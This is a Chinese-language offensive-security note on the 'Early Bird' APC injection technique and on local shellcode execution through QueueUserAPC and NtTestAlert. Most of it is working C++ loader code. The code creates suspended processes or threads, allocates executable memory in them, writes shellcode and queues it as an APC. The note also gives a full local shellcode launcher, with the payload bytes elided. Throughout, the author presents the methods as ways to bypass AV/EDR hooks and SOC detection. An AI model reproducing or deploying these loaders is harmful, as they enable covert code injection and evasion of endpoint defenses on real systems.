# Early Bird & NtTestAlert

## Early Bird简介
原理是, 系统在**初始化**线程时程序会调用`NtTestAlert`函数对APC队列进行处理清空. 所以可以在挂起的**未初始化**线程里插入APC, 唤醒的时候自动执行APC.

APC注入的变种, 太简单了随便写写, 和APC注入技术细节差别不大.

### 步骤简介

1. 以挂起的状态创建一个合法进程(类似Process Hollowing), 注意此时线程**未初始化**. 或者对已有的process创建一个挂起的线程.
	* `CreateProcessA(NULL, (LPSTR)arg[1], NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi;`
	* `CreateRemoteThread(hProcess,0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);`
2. 分配空间, 写入shellcode
	* `VirtualAllocEx`, `WriteProcessMemory`
3. APC插入主线程
	* `QueueUserAPC`
4. 挂起线程唤醒, 线程开始**初始化**调用`NtTestAlert`, 执行APC
	* `ResumeThread`

### advantage

相比于之前的普通版APC注入: Early Bird中的恶意行为发生在**Process/Thread初始化前**(创建一个挂起进程/线程, 然后再插入APC).  可以绕过一些AV/EDR的hooks 检测.


## 关键代码注释
Suspended Process:

```
	// 1. create suspended process
	STARTUPINFO pStartupInfo = { 0 };
	PROCESS_INFORMATION pProcessInfo = { 0 };
	CreateProcessA(NULL, (LPSTR)arg[1], NULL, NULL, NULL, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &pStartupInfo, &pProcessInfo);
	cout << arg[1] << " pid is " << pProcessInfo.dwProcessId << endl;
	// 2. Alloc memory and write shellcode into process
	LPVOID AllocMemory = VirtualAllocEx(pProcessInfo.hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(pProcessInfo.hProcess, AllocMemory, shellcode, sizeof(shellcode), NULL);
	// 3. Inject APC into Thread and resumeThread
	QueueUserAPC((PAPCFUNC)AllocMemory, pProcessInfo.hThread, NULL);
	ResumeThread(pProcessInfo.hThread);
```

Suspended Thread:

```
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, Pid);
	AllocAddr = VirtualAllocEx(hProcess, 0, sizeof(shellcode) + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, AllocAddr, shellcode, sizeof(shellcode) + 1, 0);
	hThread = CreateRemoteThread(hProcess,0, 0, (LPTHREAD_START_ROUTINE)0xfff, 0, CREATE_SUSPENDED, NULL);
	QueueUserAPC((PAPCFUNC)AllocAddr, hThread, 0);
	ResumeThread(hThread);
```

有点傻逼, 既然用`CreateRemoteThread`创建挂起线程再用APC注入, 那为啥不直接`CreateRemoteThread`注入shellcode.

## Shellcode Execution in a Local Process with QueueUserAPC and NtTestAlert

### 原理
上文提到的Early Bird, 本质上是利用线程创建后, 系统自动调用`NtTestAlert`清空APC队列执行APC.

所以可以直接调用这个函数来**主动执行APC**. 扩展一下思路, 也可以让目标线程主动执行进入Alert状态的函数执行APC.

但有个特别大的缺点, 就是只能让本地进程/线程执行, 没用办法远程让被注入APC的线程进程执行`NtTestAlert`. 用`CreateRemoteThread`等shellcode注入方式的话就本末倒置了.

唯一的意义就是用来当做shellcode启动器, 不依赖`CreateThread`和`CreateRemoteThread`等API, 隐蔽性良好, 能绕过SOCs and AV/EDR vendors.

### Local Process Test
不加`NtTestAlert();`, 启动器本身就不会触发APC.

```
#include <windows.h>
#include <iostream>
#include <process.h>
using namespace std;
int main(int argc, char *arg[])
{
	UCHAR shellcode[] = {...};

	LPVOID AllocMemory = VirtualAlloc(NULL,sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(GetCurrentProcess(), AllocMemory, shellcode, sizeof(shellcode), NULL);
	cout << "CurrentProcess Pid is "<< getpid()<< endl;
	QueueUserAPC((PAPCFUNC)AllocMemory, GetCurrentThread(), NULL);

	typedef VOID(NTAPI* pNtTestAlert)(VOID);
	pNtTestAlert NtTestAlert = (pNtTestAlert)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtTestAlert");
	NtTestAlert();
	return 0;
}
```

### Remote Process Test
这个没有办法, 因为要让远程进程自己执行`NtTestAlert();`, 就只能靠写进shellcode里然后注入. 那我为啥不直接`CreateRemoteThread`执行shellcode.



